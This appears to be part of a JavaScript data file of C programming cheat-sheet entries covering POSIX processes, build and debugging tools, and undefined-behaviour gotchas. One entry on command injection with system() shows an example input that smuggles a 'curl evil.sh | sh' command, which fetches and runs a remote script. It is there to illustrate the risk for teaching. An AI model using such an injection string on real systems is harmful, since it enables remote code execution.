    tags: ["fork", "wait", "waitpid", "process", "child", "unix", "posix"],
    aka: "how to create a child process",
    sum: "fork clones the process; the parent waits for the child to finish.",
    code: c`#include <sys/wait.h>
#include <unistd.h>

pid_t pid = fork();

if (pid == 0) {
    // child
    _exit(0);
} else if (pid > 0) {
    int status;
    if (waitpid(pid, &status, 0) == -1) {
        perror("waitpid");
    }
} else {
    perror("fork");
}`,
    note: "The child gets a copy-on-write copy of memory. Use _exit in the child to avoid flushing the parent's buffers twice.",
    pop: 5,
  },
  {
    title: "exec a program",
    cat: "POSIX",
    tags: ["exec", "execvp", "execl", "run", "program", "process", "posix"],
    aka: "how to run another program from c",
    sum: "exec replaces the current process image with another program.",
    code: c`#include <unistd.h>

// search PATH for the program:
execlp("ls", "ls", "-l", (char *)NULL);

// only reached on failure:
perror("execlp");`,
    note: "exec does not return on success. Usually fork first, then exec in the child. argv[0] is the program name by convention.",
    pop: 5,
  },
  {
    title: "Pipe between processes",
    cat: "POSIX",
    tags: ["pipe", "fork", "ipc", "process", "stdin", "stdout", "posix"],
    aka: "how to connect two processes with a pipe",
    sum: "pipe creates two file descriptors: one to read, one to write.",
    code: c`#include <sys/wait.h>
#include <unistd.h>

int fd[2];
if (pipe(fd) != 0) {
    perror("pipe");
}

pid_t pid = fork();
if (pid == 0) {
    dup2(fd[1], STDOUT_FILENO);
    close(fd[0]);
    close(fd[1]);
    execlp("ls", "ls", (char *)NULL);
    _exit(127);
}

close(fd[1]);
char buf[4096];
ssize_t n;
while ((n = read(fd[0], buf, sizeof buf)) > 0) {
    write(STDOUT_FILENO, buf, (size_t)n);
}
close(fd[0]);
waitpid(pid, NULL, 0);`,
    note: "Close unused ends or readers may block forever. A pipe is a one-way byte stream with no message boundaries.",
    pop: 4,
  },
  {
    title: "Signal handling with sigaction",
    cat: "POSIX",
    tags: ["signal", "sigaction", "sigint", "handler", "interrupt", "posix", "async"],
    aka: "how to handle ctrl c in a c program",
    sum: "Install a handler with sigaction and keep it async-signal-safe.",
    code: c`#include <signal.h>
#include <unistd.h>

volatile sig_atomic_t stopped = 0;

void on_sigint(int sig) {
    (void)sig;
    stopped = 1;
}

int main(void) {
    struct sigaction sa = {0};
    sa.sa_handler = on_sigint;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    if (sigaction(SIGINT, &sa, NULL) != 0) {
        return 1;
    }

    while (!stopped) {
        pause();
    }
    return 0;
}`,
    note: "In a handler, only async-signal-safe functions are allowed (write, _exit, signal). Do not call printf or malloc.",
    pop: 5,
  },
  {
    title: "nanosleep",
    cat: "POSIX",
    tags: ["nanosleep", "sleep", "delay", "nanoseconds", "wait", "posix"],
    aka: "how to sleep for milliseconds",
    sum: "nanosleep pauses for a timespec interval and can report the remaining time.",
    code: c`#include <time.h>

struct timespec req = {
    .tv_sec = 0,
    .tv_nsec = 250 * 1000 * 1000,   // 250 ms
};

struct timespec rem;
if (nanosleep(&req, &rem) != 0) {
    // interrupted by a signal; rem holds the remaining time
}`,
    note: "POSIX. A signal can interrupt the sleep with EINTR. C11's thrd_sleep has similar semantics.",
    pop: 4,
  },
  {
    title: "Absolute path with realpath",
    cat: "POSIX",
    tags: ["realpath", "absolute", "path", "resolve", "symlink", "canonical", "posix"],
    aka: "how to get the absolute path of a file",
    sum: "realpath resolves ., .., and symlinks into a canonical absolute path.",
    code: c`#include <limits.h>
#include <stdlib.h>

char *abs = realpath("data.txt", NULL);
if (!abs) {
    perror("realpath");
    return 1;
}

puts(abs);
free(abs);`,
    note: "Passing NULL makes realpath allocate the result (POSIX.1-2008). The file generally must exist.",
    pop: 3,
  },

  {
    title: "AddressSanitizer",
    cat: "Tooling",
    tags: ["asan", "addresssanitizer", "sanitizer", "memory", "overflow", "leak", "debug"],
    aka: "how to find memory bugs in c",
    sum: "Compile with -fsanitize=address to catch out-of-bounds, use-after-free, and leaks.",
    code: c`gcc -std=c17 -g -O1 \
    -fsanitize=address,undefined \
    -fno-omit-frame-pointer \
    main.c -o main

./main`,
    note: "ASan slows execution and uses more memory; use it during development and testing, not in release builds.",
    pop: 6,
  },
  {
    title: "UndefinedBehaviorSanitizer",
    cat: "Tooling",
    tags: ["ubsan", "undefined", "sanitizer", "overflow", "shift", "null", "debug"],
    aka: "how to catch undefined behavior",
    sum: "UBSan instruments operations that would be undefined behavior.",
    code: c`gcc -std=c17 -g \
    -fsanitize=undefined \
    -fno-sanitize-recover=all \
    main.c -o main

./main`,
    note: "Catches signed overflow, bad shifts, misaligned access, and more. Combine with AddressSanitizer for coverage.",
    pop: 5,
  },
  {
    title: "gdb basics",
    cat: "Tooling",
    tags: ["gdb", "debugger", "breakpoint", "backtrace", "step", "inspect", "debug"],
    aka: "how to debug a c program with gdb",
    sum: "Compile with -g, then set breakpoints and inspect the running program.",
    code: c`gcc -g -O0 main.c -o main
gdb ./main

(gdb) break main
(gdb) run arg1 arg2
(gdb) next
(gdb) print x
(gdb) backtrace
(gdb) continue
(gdb) quit`,
    note: "Use -O0 for predictable stepping. `layout src` enters the TUI; `bt` shows the call stack after a crash.",
    pop: 6,
  },
  {
    title: "valgrind",
    cat: "Tooling",
    tags: ["valgrind", "memcheck", "leak", "memory", "debug", "uninitialized", "tool"],
    aka: "how to check for memory leaks and invalid reads",
    sum: "Valgrind runs an instrumented binary and reports memory errors and leaks.",
    code: c`gcc -g -O0 main.c -o main
valgrind --leak-check=full \
         --show-leak-kinds=all \
         --track-origins=yes \
         ./main`,
    note: "Much slower than ASan but catches uninitialized reads well. Compile with -g so reports show source lines.",
    pop: 6,
  },
  {
    title: "make",
    cat: "Tooling",
    tags: ["make", "makefile", "build", "target", "dependency", "automation"],
    aka: "how to write a makefile",
    sum: "Describe targets, dependencies, and commands; make rebuilds only what changed.",
    code: c`CC = cc
CFLAGS = -std=c17 -Wall -Wextra -O2 -g

app: main.o util.o
	$(CC) $(CFLAGS) -o $@ $^

main.o: main.c util.h
util.o: util.c util.h

clean:
	rm -f app *.o

.PHONY: clean`,
    note: "Recipe lines must start with a tab. $@ is the target, $< the first prerequisite, $^ all prerequisites.",
    pop: 5,
  },
  {
    title: "Compile to object files",
    cat: "Tooling",
    tags: ["object", "compile", "link", "incremental", "o", "build", "separate"],
    aka: "what does gcc -c do",
    sum: "-c compiles without linking, producing a .o file you can link later.",
    code: c`gcc -std=c17 -Wall -c main.c -o main.o
gcc -std=c17 -Wall -c util.c -o util.o

gcc main.o util.o -o app`,
    note: "Separate compilation enables incremental builds and lets you mix languages. Link order still matters.",
    pop: 5,
  },
  {
    title: "Link a library",
    cat: "Tooling",
    tags: ["link", "library", "l", "L", "shared", "static", "ld", "gcc"],
    aka: "how to link a library in gcc",
    sum: "-L adds a search directory; -l names the library without its prefix and suffix.",
    code: c`gcc main.c -L./lib -lfoo -o main

# libfoo.so or libfoo.a is searched in ./lib

# static linking:
gcc main.c -static -L./lib -lfoo -o main`,
    note: "Put libraries after the object files that use them. Use ldd to see runtime dependencies.",
    pop: 5,
  },
  {
    title: "Optimization levels",
    cat: "Tooling",
    tags: ["optimization", "O0", "O1", "O2", "O3", "release", "speed", "size"],
    aka: "which gcc optimization flag should i use",
    sum: "-O0 is for debugging; -O2 is the usual release choice.",
    code: c`gcc -O0 -g main.c -o debug      # no optimization

gcc -O2 main.c -o app           # good default
gcc -O3 -march=native main.c    # aggressive, machine-specific
gcc -Os main.c -o small         # optimize for size`,
    note: "Higher optimization can expose hidden UB. Test with sanitizers at -O0/-O1, benchmark before choosing -O3.",
    pop: 5,
  },
  {
    title: "Debug symbols",
    cat: "Tooling",
    tags: ["debug", "symbols", "g", "dwarf", "gdb", "profiling", "strip"],
    aka: "what does gcc -g do",
    sum: "-g includes source-level debug information in the binary.",
    code: c`gcc -g -O0 main.c -o main
gdb ./main

# split symbols from the release binary:
objcopy --only-keep-debug main main.debug
strip main`,
    note: "Debug symbols make binaries larger but do not change behavior. Keep them for crash reports and profiling.",
    pop: 4,
  },
  {
    title: "Static analysis",
    cat: "Tooling",
    tags: ["static", "analysis", "clang", "tidy", "cppcheck", "analyzer", "lint"],
    aka: "how to find bugs without running the program",
    sum: "Compilers and dedicated tools can find bugs by analyzing the code.",
    code: c`gcc -fanalyzer -Wall -Wextra main.c

clang --analyze main.c

cppcheck --enable=warning,style,performance main.c

clang-tidy main.c -- -std=c17`,
    note: "Catches paths tests miss, but produces false positives. Pair with sanitizers, tests, and warnings.",
    pop: 5,
  },
  {
    title: "Preprocess and assembly output",
    cat: "Tooling",
    tags: ["preprocess", "assembly", "E", "S", "compiler", "macros", "codegen"],
    aka: "how to see the preprocessed output or assembly",
    sum: "Stop the compiler after preprocessing, assembly, or object generation.",
    code: c`gcc -E main.c -o main.i   # after preprocessing
gcc -S main.c -o main.s   # assembly
gcc -c main.c -o main.o   # object code

# inspect macro expansion:
gcc -E -P main.c | less`,
    note: "-E is the fastest way to debug macros and include problems. -S shows what the optimizer did.",
    pop: 4,
  },

  {
    title: "Signed integer overflow",
    cat: "Gotchas",
    tags: ["signed", "overflow", "int_max", "wrap", "undefined", "integer", "u"],
    aka: "why does int overflow crash or misbehave",
    sum: "Signed overflow is undefined behavior; unsigned overflow wraps.",
    code: c`#include <limits.h>

int x = INT_MAX;
x = x + 1;    // undefined behavior

unsigned u = UINT_MAX;
u = u + 1;    // wraps to 0

// check before adding:
if (a > INT_MAX - b) { /* overflow */ }`,
    note: "Compilers may assume signed overflow never happens and optimize accordingly. Use unsigned or wider types when wrapping is intended.",
    pop: 6,
  },
  {
    title: "Unsigned wraparound",
    cat: "Gotchas",
    tags: ["unsigned", "underflow", "wrap", "loop", "size_t", "negative"],
    aka: "why is my unsigned loop infinite",
    sum: "Unsigned values wrap instead of going negative.",
    code: c`for (unsigned i = n; i >= 0; i--) {
    // i >= 0 is always true
}

// correct:
for (unsigned i = n; i-- > 0; ) { }

// or use a signed type when counting down past zero.`,
    note: "size_t is unsigned. Subtracting 1 from 0 gives SIZE_MAX, often causing huge allocations or loops.",
    pop: 6,
  },
  {
    title: "Shift past the width",
    cat: "Gotchas",
    tags: ["shift", "bits", "undefined", "width", "int", "ub"],
    aka: "why does 1 << 32 give the wrong answer",
    sum: "Shifting by the type width or more is undefined; shifting negatives is implementation-defined.",
    code: c`int x = 1 << 32;     // UB on 32-bit int
int y = -1 >> 1;     // implementation-defined

unsigned u = 1u << 31;   // okay
uint64_t v = 1ull << 40; // okay`,
    note: "Use 1ULL or the correct unsigned width. Shifting into or past the sign bit is also a trap.",
    pop: 5,
  },
  {
    title: "Unsequenced modifications",
    cat: "Gotchas",
    tags: ["sequence", "point", "unsequenced", "i++", "undefined", "evaluation", "order"],
    aka: "why is i = i++ undefined",
    sum: "Modifying the same object twice without an intervening sequence point is undefined behavior.",
    code: c`int i = 0;
i = i++ + ++i;          // UB
printf("%d %d\n", i++, i++); // UB: order unspecified

int a[2] = {0, 0};
int idx = 0;
a[idx] = idx++;         // UB`,
    note: "Split into separate statements. Even function argument evaluation order is unspecified.",
    pop: 5,
  },
  {
    title: "Strict aliasing",
    cat: "Gotchas",
    tags: ["aliasing", "strict", "pointer", "cast", "undefined", "optimization", "type"],
    aka: "why does casting a pointer break with optimization",
    sum: "Accessing an object through an incompatible pointer type is undefined behavior.",
    code: c`float f = 1.0f;
int *ip = (int *)&f;
printf("%d\n", *ip);      // UB: violates strict aliasing

uint32_t bits;
memcpy(&bits, &f, sizeof bits);   // portable

// char* is allowed to inspect any object:
unsigned char *bytes = (unsigned char *)&f;`,
    note: "The compiler may assume pointers of different types do not overlap. Use memcpy, a union, or -fno-strict-aliasing.",
    pop: 5,
  },
  {
    title: "Null dereference",
    cat: "Gotchas",
    tags: ["null", "dereference", "segfault", "crash", "pointer", "check"],
    aka: "why does my program segfault",
    sum: "Dereferencing NULL is undefined behavior and usually crashes.",
    code: c`int *p = NULL;
printf("%d\n", *p);   // crash or UB

if (p != NULL) {
    printf("%d\n", *p);
}`,
    note: "Also check pointers returned by malloc, fopen, strchr, and functions that can fail.",
    pop: 7,
  },
  {
    title: "Array out of bounds",
    cat: "Gotchas",
    tags: ["array", "bounds", "out", "of", "bounds", "overflow", "index", "ub"],
    aka: "why does writing past an array corrupt memory",
    sum: "Valid indexes are 0 through n-1. Anything else is undefined behavior.",
    code: c`int a[3];
a[3] = 1;      // out of bounds

for (size_t i = 0; i <= 3; i++) {
    a[i] = 0;  // writes a[3]
}

// correct:
for (size_t i = 0; i < 3; i++) a[i] = 0;`,
    note: "C does no bounds checking. AddressSanitizer catches many violations during testing.",
    pop: 7,
  },
  {
    title: "Missing return value",
    cat: "Gotchas",
    tags: ["return", "missing", "value", "function", "undefined", "warning"],
    aka: "what happens if a function does not return a value",
    sum: "A non-void function that reaches the closing brace without returning has undefined behavior (except main).",
    code: c`int sign(int x) {
    if (x < 0) return -1;
    if (x > 0) return 1;
    // missing return 0
}

// fix:
int sign2(int x) {
    return (x > 0) - (x < 0);
}`,
    note: "Compile with -Wreturn-type. main is special: falling off the end returns 0.",
    pop: 5,
  },
  {
    title: "printf format mismatch",
    cat: "Gotchas",
    tags: ["printf", "format", "mismatch", "specifier", "undefined", "crash", "type"],
    aka: "why does printf print garbage or crash",
    sum: "The format specifier must match the promoted argument type.",
    code: c`printf("%d\n", 3.14);   // UB: double, not int
printf("%f\n", 42);     // UB: int, not double
printf("%s\n", 'x');    // crash: char, not char *

// correct:
printf("%.2f\n", 3.14);
printf("%d\n", 42);
printf("%c\n", 'x');`,
    note: "Enable -Wformat=2. Variadic arguments are promoted: float becomes double, char becomes int.",
    pop: 5,
  },
  {
    title: "Print size_t with %zu",
    cat: "Gotchas",
    tags: ["size_t", "printf", "zu", "format", "portable", "unsigned", "specifier"],
    aka: "how to print size_t correctly",
    sum: "size_t needs %zu (C99), not %d or %lu.",
    code: c`size_t n = strlen(s);
printf("%zu\n", n);

ptrdiff_t d = end - start;
printf("%td\n", d);

int64_t big = 42;
printf("%" PRId64 "\n", big);`,
    note: "Casting to unsigned long works on many systems but breaks on 32-bit Windows. Use the matching specifier.",
    pop: 4,
  },
  {
    title: "scanf type mismatch",
    cat: "Gotchas",
    tags: ["scanf", "format", "type", "double", "float", "address", "input"],
    aka: "why does scanf crash or read the wrong value",
    sum: "scanf needs addresses, and %f means float* while %lf means double*.",
    code: c`int n;
scanf("%d", &n);      // missing & is a classic bug

double d;
scanf("%lf", &d);     // %f would expect float*

char name[32];
scanf("%31s", name);  // array already decays to a pointer`,
    note: "Check the return value: it is the number of items assigned. Never use unbounded %s.",
    pop: 6,
  },
  {
    title: "strcmp is not boolean",
    cat: "Gotchas",
    tags: ["strcmp", "compare", "string", "boolean", "zero", "equal"],
    aka: "why is strcmp returning true when strings are equal",
    sum: "strcmp returns 0 when strings are equal, so the result is true when they differ.",
    code: c`if (strcmp(a, b)) {
    // strings differ
}

if (strcmp(a, b) == 0) {
    // strings are equal
}`,
    note: "The sign tells lexical order: <0, 0, >0. Compare with == 0, not with 1.",
    pop: 6,
  },
  {
    title: "ctype and negative chars",
    cat: "Gotchas",
    tags: ["ctype", "isalpha", "toupper", "negative", "char", "unsigned", "eof"],
    aka: "why does isalpha crash on accented characters",
    sum: "ctype functions require EOF or an unsigned char value.",
    code: c`char c = (char)0xE9;      // negative on signed-char systems

isalpha(c);                 // undefined behavior
isalpha((unsigned char)c);  // correct

toupper((unsigned char)c);`,
    note: "Plain char may be signed. Cast to unsigned char in isalpha, isdigit, isspace, toupper, and friends.",
    pop: 4,
  },
  {
    title: "Casting malloc",
    cat: "Gotchas",
    tags: ["malloc", "cast", "void", "pointer", "c", "c++", "header"],
    aka: "should i cast the result of malloc",
    sum: "In C, do not cast malloc: it hides a missing stdlib.h declaration.",
    code: c`#include <stdlib.h>

int *p = malloc(n * sizeof *p);      // C
// int *p = (int *)malloc(...);      // C++ style

if (!p) {
    // handle failure
}`,
    note: "C converts void* implicitly. The cast is required in C++ but masks errors in C.",
    pop: 5,
  },
  {
    title: "Freeing a non-heap pointer",
    cat: "Gotchas",
    tags: ["free", "stack", "literal", "invalid", "pointer", "heap", "crash"],
    aka: "can i free a local variable or string literal",
    sum: "Only free pointers returned by the malloc family.",
    code: c`int x = 1;
free(&x);            // UB: stack address

char *s = "literal";
free(s);             // UB: not heap memory

int a[10];
free(a);             // UB: not heap memory`,
    note: "free(NULL) is safe. Every other free needs a matching allocation from malloc, calloc, realloc, or aligned_alloc.",
    pop: 5,
  },
  {
    title: "gets is gone",
    cat: "Gotchas",
    tags: ["gets", "removed", "unsafe", "overflow", "fgets", "input"],
    aka: "why is gets not allowed",
    sum: "gets cannot limit input and was removed from C11.",
    code: c`char buf[64];
gets(buf);   // removed in C11, never use

fgets(buf, sizeof buf, stdin);   // bounded
getline(&line, &cap, stdin);     // POSIX, grows`,
    note: "Even compilers that still provide gets warn about it. Use fgets or getline and strip the newline.",
    pop: 5,
  },
  {
    title: "fflush(stdin) is undefined",
    cat: "Gotchas",
    tags: ["fflush", "stdin", "undefined", "input", "buffer", "clear"],
    aka: "how to clear the input buffer in c",
    sum: "fflush is only defined for output streams; flushing stdin is undefined behavior.",
    code: c`fflush(stdin);   // UB

// discard the rest of a line:
int c;
while ((c = getchar()) != '\n' && c != EOF) { }

// or read input with fgets instead.`,
    note: "Some platforms support it as an extension, which is why the bug survives copy-paste.",
    pop: 5,
  },
  {
    title: "Command injection with system",
    cat: "Gotchas",
    tags: ["system", "injection", "security", "shell", "command", "input", "exec"],
    aka: "is system safe with user input",
    sum: "system passes the string to a shell, so metacharacters can run arbitrary commands.",
    code: c`char cmd[256];
snprintf(cmd, sizeof cmd, "rm %s", user_input);
system(cmd);   // user_input = "x; curl evil.sh | sh"

// safer: exec with an argument vector
execlp("rm", "rm", "--", user_input, (char *)NULL);`,
    note: "Avoid system in security-sensitive code. Validate input and prefer fork/exec with separate argv entries.",
    pop: 5,
  },
  {
    title: "rand() low bits",
    cat: "Gotchas",
    tags: ["rand", "random", "low", "bits", "bias", "modulo", "quality"],
    aka: "why is rand() % 2 always alternating",
    sum: "Low bits of rand may be poor; rand is not suitable for cryptography.",
    code: c`rand() % 2;   // low bit can be weak on old implementations

// use the high bits:
int r = (int)((double)rand() / ((double)RAND_MAX + 1) * n);

// for real randomness use /dev/urandom or getrandom()`,
    note: "rand is fine for toys. Do not use it for passwords, tokens, keys, or simulations that need quality.",
    pop: 4,
  },
  {
    title: "Compare floats with a tolerance",
    cat: "Gotchas",
    tags: ["float", "equality", "epsilon", "compare", "precision", "double", "tolerance"],
    aka: "why is 0.1 + 0.2 not equal to 0.3",
    sum: "Binary floating point cannot represent most decimals exactly; compare within an epsilon.",
    code: c`if (0.1 + 0.2 == 0.3) {
    // false
}

#include <math.h>
if (fabs((0.1 + 0.2) - 0.3) < 1e-9) {
    // close enough
}`,
    note: "Scale the tolerance to the magnitude, or compare integer representations. Never use == for computed floats.",
    pop: 6,
  },
  {
    title: "Implicit function declaration",
    cat: "Gotchas",
    tags: ["implicit", "declaration", "prototype", "header", "warning", "c99", "compile"],
    aka: "why does the compiler assume a function returns int",
    sum: "Calling a function without a visible prototype is an error in C99 and later.",
    code: c`int main(void) {
    printf("hi\n");   // error without #include <stdio.h>
    return 0;
}

// fix:
#include <stdio.h>`,
    note: "Old compilers defaulted to int, which causes crashes on 64-bit systems. Use -Werror=implicit-function-declaration.",
    pop: 5,
  },
  {
    title: "void main",
    cat: "Gotchas",
    tags: ["void", "main", "signature", "return", "standard", "startup"],
    aka: "is void main valid",
    sum: "The standard entry points return int; void main is not portable.",
    code: c`void main(void) { }   // nonstandard

int main(void) {       // correct
    return 0;
}

int main(int argc, char *argv[]) {  // with arguments
    return 0;
}`,
    note: "Some compilers accept void main, but the startup code expects an int return value.",
    pop: 5,
  },
  {
    title: "Uninitialized pointer",
    cat: "Gotchas",
    tags: ["uninitialized", "pointer", "wild", "garbage", "crash", "local"],
    aka: "why does my pointer contain garbage",
    sum: "Local variables, including pointers, start with indeterminate values.",
    code: c`int *p;
*p = 1;        // wild pointer: UB

int *q = NULL; // safe sentinel
if (q) {
    *q = 1;
}`,
    note: "Initialize at declaration. Static and global pointers are zero-initialized; automatic locals are not.",
    pop: 5,
  },
  {
    title: "Overlapping memcpy",
    cat: "Gotchas",
    tags: ["memcpy", "memmove", "overlap", "copy", "undefined", "buffer"],
    aka: "why does memcpy corrupt data when regions overlap",
    sum: "memcpy requires non-overlapping regions; memmove handles overlap.",
    code: c`char buf[32] = "abcdef";

memcpy(buf + 1, buf, 5);    // UB: overlapping
memmove(buf + 1, buf, 5);   // correct: "aabcde"`,
    note: "Copying to a later position in the same buffer is the classic overlap case. Use memmove when unsure.",
    pop: 4,
  },

  {
    title: "sprintf is unsafe",
    cat: "Gotchas",
    tags: ["sprintf", "overflow", "buffer", "snprintf", "format", "unsafe", "write"],
    aka: "why is sprintf dangerous",
    sum: "sprintf writes without a size limit; snprintf takes the buffer size.",
    code: c`char buf[16];
sprintf(buf, "%s", long_text);          // overflow risk

snprintf(buf, sizeof buf, "%s", long_text); // bounded

// snprintf returns the length it wanted:
int need = snprintf(NULL, 0, "%s", long_text);`,
    note: "snprintf truncates safely and NUL-terminates. Check the return value if truncation matters.",
    pop: 6,
  },
  {
    title: "strncpy does not guarantee a NUL",
    cat: "Gotchas",
    tags: ["strncpy", "nul", "terminate", "copy", "string", "truncate", "padding"],
    aka: "why is my string not null terminated after strncpy",
    sum: "If the source is at least n bytes, strncpy writes no terminator.",
    code: c`char dst[8];
strncpy(dst, src, sizeof dst);
dst[sizeof dst - 1] = '\0';   // force termination

// simpler and safer:
snprintf(dst, sizeof dst, "%s", src);`,
    note: "strncpy also pads the rest of the buffer with NULs, which is often wasted work. Prefer snprintf.",
    pop: 5,
  },
  {
    title: "memchr",
    cat: "Strings",
    tags: ["memchr", "find", "byte", "search", "buffer", "character", "binary"],
    aka: "how to find a byte in a buffer",
    sum: "memchr searches a byte range for one byte.",
    code: c`#include <string.h>

char buf[256];
size_t n = fread(buf, 1, sizeof buf, fp);

char *nl = memchr(buf, '\n', n);
if (nl) {
    printf("newline at offset %td\n", nl - buf);
}`,
    note: "Unlike strchr, memchr takes an explicit length and works on binary data containing NUL bytes.",
    pop: 4,
  },
  {
    title: "ungetc",
    cat: "Files",
    tags: ["ungetc", "pushback", "character", "stream", "lookahead", "parse"],
    aka: "how to put a character back into a stream",
    sum: "ungetc pushes one character back so the next read returns it.",
    code: c`int c = fgetc(fp);

if (c == '/') {
    int next = fgetc(fp);
    if (next != '/') {
        ungetc(next, fp);   // not a comment; reprocess it
    }
}`,
    note: "Only one byte of pushback is guaranteed. Pushing back EOF does nothing.",
    pop: 3,
  },
  {
    title: "freopen",
    cat: "Files",
    tags: ["freopen", "redirect", "stdout", "stdin", "stream", "reopen"],
    aka: "how to redirect stdout to a file",
    sum: "freopen closes a stream and reopens it on another file.",
    code: c`#include <stdio.h>

if (!freopen("output.txt", "w", stdout)) {
    perror("freopen");
    return 1;
}

printf("this goes to output.txt\n");`,
    note: "Handy for quick redirection, but it mutates a global stream. Prefer passing a FILE * explicitly in libraries.",
    pop: 3,
  },
  {
    title: "char16_t and char32_t",
    cat: "Types",
    tags: ["char16_t", "char32_t", "unicode", "utf16", "utf32", "uchar", "wide"],
    aka: "what are char16_t and char32_t",
    sum: "C11 adds fixed-width Unicode code-unit types in <uchar.h>.",
    code: c`#include <uchar.h>

char16_t u16[] = u"hello";     // UTF-16 code units
char32_t u32[] = U"héllo";     // UTF-32 code points

printf("%zu %zu\n", sizeof u16, sizeof u32);`,
    note: "Neither type is UTF-8. Convert with mbrtoc16/mbrtoc32 and c16rtomb/c32rtomb, and set a UTF-8 locale.",
    pop: 3,
  },
  {
    title: "setlocale",
    cat: "Stdlib",
    tags: ["setlocale", "locale", "localization", "language", "utf8", "collation", "format"],
    aka: "how to enable utf-8 or change the locale",
    sum: "setlocale selects the locale used by ctype, formatting, and sorting.",
    code: c`#include <locale.h>

setlocale(LC_ALL, "");          // from the environment

setlocale(LC_NUMERIC, "C");     // keep printf decimal points portable

const char *name = setlocale(LC_ALL, NULL); // query only`,
    note: "Locale is global process state. It can change printf's decimal separator, strftime output, and strcoll order.",
    pop: 4,
  },
  {
    title: "Checked arithmetic (C23)",
    cat: "Stdlib",
    tags: ["ckd_add", "ckd_mul", "overflow", "checked", "arithmetic", "c23", "stdckdint"],
    aka: "how to detect integer overflow safely",
    sum: "C23's stdckdint.h provides overflow-checking add, subtract, and multiply.",
    code: c`#include <stdckdint.h>

int result;
if (ckd_add(&result, a, b)) {
    // overflow occurred; result is unspecified
}

long long product;
if (ckd_mul(&product, x, y)) {
    // overflow
}`,
    note: "Works for signed and unsigned integer types. Requires C23; before that, check ranges manually.",
    pop: 4,
  },
  {
    title: "Bit operations (C23)",
    cat: "Stdlib",
    tags: ["stdbit", "count", "ones", "zeros", "leading", "trailing", "bits", "c23"],
    aka: "how to count set bits in an integer",
    sum: "C23's stdbit.h counts and locates bits without compiler-specific builtins.",
    code: c`#include <stdbit.h>

unsigned v = 0b101100;

unsigned ones  = stdc_count_ones(v);    // 3
unsigned width = stdc_bit_width(v);     // 6
unsigned lead  = stdc_leading_zeros(v); // 26 for 32-bit unsigned

if (stdc_has_single_bit(v)) {
    // power of two
}`,
    note: "C23 only. Before that use __builtin_popcount/clz/ctz (GCC/Clang) or a loop.",
    pop: 3,
  },

];
